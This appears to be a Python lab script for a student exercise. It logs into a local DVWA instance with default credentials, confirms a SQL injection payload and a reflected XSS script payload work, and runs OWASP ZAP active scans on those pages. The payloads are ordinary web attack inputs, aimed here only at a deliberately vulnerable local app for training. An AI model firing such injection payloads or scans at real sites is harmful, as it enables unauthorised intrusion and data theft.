import requests,re,json,time
from pathlib import Path
s=requests.Session(); base='http://127.0.0.1:8088'
def token(text):
    m=re.search("name='user_token' value='([^']+)'",text)
    if not m: raise RuntimeError('No se encontro token CSRF')
    return m[1]
r=s.get(base+'/setup.php'); r=s.post(base+'/setup.php',data={'create_db':'Create / Reset Database','user_token':token(r.text)})
print('SETUP HTTP',r.status_code, 'created' in r.text.lower(),flush=True)
r=s.get(base+'/login.php'); r=s.post(base+'/login.php',data={'username':'admin','password':'password','Login':'Login','user_token':token(r.text)})
assert 'login.php' not in r.url, r.text[:200]
s.cookies.set('security','low',domain='127.0.0.1',path='/')
print('DVWA autenticado; nivel low; objetivo local',flush=True)
r=s.get(base+'/vulnerabilities/sqli/',params={'id':'1','Submit':'Submit'})
normal=r.text.count('First name:')
r=s.get(base+'/vulnerabilities/sqli/',params={'id':"1' OR '1'='1",'Submit':'Submit'})
found=r.text.count('First name:')
Path('sqli_response.html').write_text(r.text)
print('SQLi: registros normales',normal,'; con inyeccion',found,flush=True)
assert normal==1 and found>normal
payload='<script>alert("LAB-XSS")</script>'
r=s.get(base+'/vulnerabilities/xss_r/',params={'name':payload})
Path('xss_response.html').write_text(r.text)
print('XSS: script sin codificar en respuesta HTML:',payload in r.text,flush=True)
assert payload in r.text
cookie='; '.join(k+'='+v for k,v in s.cookies.get_dict().items())
z='http://127.0.0.1:8090/JSON/'
def api(path,**kw):
    for attempt in range(10):
        r=requests.get(z+path+'/',params=dict(apikey='actividad4',**kw),timeout=15)
        if r.status_code==400 and path=='ascan/action/scan' and attempt<9:
            time.sleep(.5)
            continue
        r.raise_for_status()
        return r.json()
print('ZAP version',api('core/view/version'),flush=True)
# Permite repetir la practica sin duplicar la regla de sesion.
requests.get(z+'replacer/action/removeRule/',params=dict(apikey='actividad4',description='DVWA-local-auth'),timeout=15)
api('ascan/action/disableAllScanners')
api('ascan/action/enableScanners',ids='40018,40012')
print('Cookie del escaner configurada',api('replacer/action/addRule',description='DVWA-local-auth',enabled='true',matchType='REQ_HEADER',matchRegex='false',matchString='Cookie',replacement=cookie),flush=True)
for path,params in [('sqli',{'id':'1','Submit':'Submit'}),('xss_r',{'name':'alumno'})]:
    url=requests.Request('GET',base+'/vulnerabilities/'+path+'/',params=params).prepare().url
    s.get(url,proxies={'http':'http://127.0.0.1:8090'})
    time.sleep(1)  # El registro en el arbol de sitios de ZAP es asincrono.
    result=api('ascan/action/scan',url=url.split('?')[0],recurse='true'); print('Escaneo',path,result,flush=True)
    scan=result['scan']
    for i in range(120):
        progress=api('ascan/view/status',scanId=scan)['status']
        if i%5==0:print('Avance',path,progress,flush=True)
        if progress=='100':break
        time.sleep(2)
    else:
        api('ascan/action/stop',scanId=scan)
        raise RuntimeError('Escaneo incompleto; no se declara finalizado')
    print('Escaneo completado',path,progress,flush=True)
alerts=api('core/view/alerts',baseurl=base)['alerts']
Path('zap_alertas.json').write_text(json.dumps(alerts,indent=2))
for a in alerts:print('ZAP:',a['risk'],a['alert'],'CWE',a.get('cweid'),flush=True)
print('FINAL DVWA/ZAP; revisar JSON y HTML conservados',flush=True)
